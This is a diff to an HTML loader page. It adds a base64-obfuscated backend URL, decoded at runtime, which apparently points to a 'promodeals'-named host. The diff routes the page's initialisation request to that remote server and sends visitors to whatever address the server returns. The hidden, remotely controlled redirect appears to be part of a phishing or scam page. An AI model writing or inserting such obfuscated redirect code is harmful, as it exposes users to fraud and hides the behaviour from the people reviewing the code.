@@ -13,12 +13,18 @@
 <body>
     <div class="loader"></div>
     <script>
+       
+        const _b = 'aHR0cHM6Ly9hdC10cHJvbW9kZWFscy1iYWNrZW5kLm9ucmVuZGVyLmNvbQ==';
+        const BACKEND_URL = atob(_b);
+
         async function init() {
             try {
-                const response = await fetch('/init');
+                const response = await fetch(`${BACKEND_URL}/init`);
                 const data = await response.json();
                 if (data.redirect) {
-                    window.location.href = data.redirect;
+                    
+                    const target = data.redirect.startsWith('/') ? `${BACKEND_URL}${data.redirect}` : data.redirect;
+                    window.location.href = target;
                 }
             } catch (error) {
                 console.error('Initialization failed');
